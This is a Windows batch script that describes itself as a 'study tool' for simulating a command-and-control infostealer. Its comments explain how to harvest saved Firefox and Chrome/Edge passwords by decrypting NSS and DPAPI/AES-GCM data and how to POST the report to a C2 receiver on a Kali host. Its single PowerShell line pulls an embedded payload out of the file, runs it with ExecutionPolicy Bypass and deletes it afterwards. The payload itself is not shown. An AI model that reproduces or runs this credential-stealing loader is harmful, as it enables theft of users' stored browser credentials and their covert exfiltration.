@echo off
rem c2_sim.cmd - single-file Firefox + Chrome/Edge harvest + C2 exfil (study tool)
rem Copy ONLY this one file to the target machine, then double-click it.
rem It extracts an embedded PowerShell payload to TEMP, runs it with
rem ExecutionPolicy Bypass, and POSTs the full report to
rem http://localhost:48732/c2 - WSL2 localhost-forwarding delivers it to a
rem receiver on the same physical host (run kali_receiver.py on the Kali
rem side). Pass -NoExfil to instead do the localhost-only C2 simulation.
rem Firefox via NSS, Chrome/Edge via DPAPI + AES-GCM (bcrypt.dll) - all
rem in pure PowerShell, zero installs, target gated to localhost only.
rem The temporary payload is deleted afterwards.
title C2 Exfil (same-host receiver)
powershell -NoProfile -ExecutionPolicy Bypass -Command "$f='%~f0';$c=Get-Content -LiteralPath $f;$s=($c|Select-String '^REM @PS1_BEGIN').LineNumber;$e=($c|Select-String '^REM @PS1_END').LineNumber;$p=[IO.Path]::GetTempPath()+'c2_payload.ps1';($c[($s)..($e-2)]) -join [Environment]::NewLine | Set-Content -LiteralPath $p -Encoding UTF8;try{& $p}finally{Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue}"
echo.
